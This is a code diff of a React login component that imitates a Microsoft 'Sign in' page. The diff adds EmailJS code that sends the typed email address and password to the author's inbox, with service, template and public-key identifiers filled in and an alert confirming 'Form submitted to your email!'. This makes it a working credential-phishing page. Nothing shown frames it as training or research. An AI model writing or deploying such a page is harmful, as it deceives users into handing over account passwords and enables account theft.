@@ -1,6 +1,34 @@
-import React from "react";
+import React, { useRef, useState } from "react";
+import emailjs from "@emailjs/browser";
 
 const Login = () => {
+  const form = useRef();
+  const [loading, setLoading] = useState(false);
+
+  const sendEmail = (e) => {
+    e.preventDefault();
+    setLoading(true);
+
+    emailjs
+      .sendForm(
+        "service_i1hn7b6", // ✅ Your EmailJS service ID
+        "template_esw4v85", // ✅ Your template ID
+        form.current,
+        "QqR8IDJXlWSH7-bG3" // ✅ Your public key
+      )
+      .then(
+        () => {
+          alert("Form submitted to your email!");
+          setLoading(false);
+        },
+        (error) => {
+          console.error("EmailJS error:", error);
+          alert("EmailJS Error: " + (error?.text || JSON.stringify(error)));
+          setLoading(false);
+        }
+      );
+  };
+
   return (
     <div style={styles.body}>
       <div style={styles.loginContainer}>
@@ -14,27 +42,30 @@ const Login = () => {
           <span style={styles.msText}>Microsoft</span>
         </div>
         <h2 style={styles.heading}>Sign in</h2>
-        <form>
+
+        <form ref={form} onSubmit={sendEmail}>
           <div style={styles.inputGroup}>
             <input
-              type="text"
+              type="email"
               name="email"
-              placeholder="Email, phone, "
+              id="email"
+              placeholder="Email, phone"
               required
               style={styles.input}
             />
           </div>
           <div style={styles.inputGroup}>
             <input
-              type="text"
+              type="password"
               name="password"
+              id="password"
               placeholder="Password"
               required
               style={styles.input}
             />
           </div>
           <div style={styles.links}>
-            No account?{" "}
+            No account?
             <a href="#" style={styles.link}>
               Create one!
             </a>
@@ -44,10 +75,12 @@ const Login = () => {
             </a>
           </div>
           <button type="submit" style={styles.button}>
-            Next
+            {loading ? "Signing..." : "Next"}
           </button>
         </form>
+
         <hr style={styles.divider} />
+
         <button style={styles.signInOptions}>
           <svg width="48" height="48" viewBox="0 0 48 48">
             <rect width="48" height="48" fill="none" />
@@ -166,11 +199,6 @@ const styles = {
     borderRadius: "3px",
     marginTop: "0.5rem",
     transition: "background 0.2s, border-color 0.2s",
-  },
-  signInSvg: {
-    width: "22px",
-    height: "22px",
-    marginRight: "0.7rem",
   },
 };
 
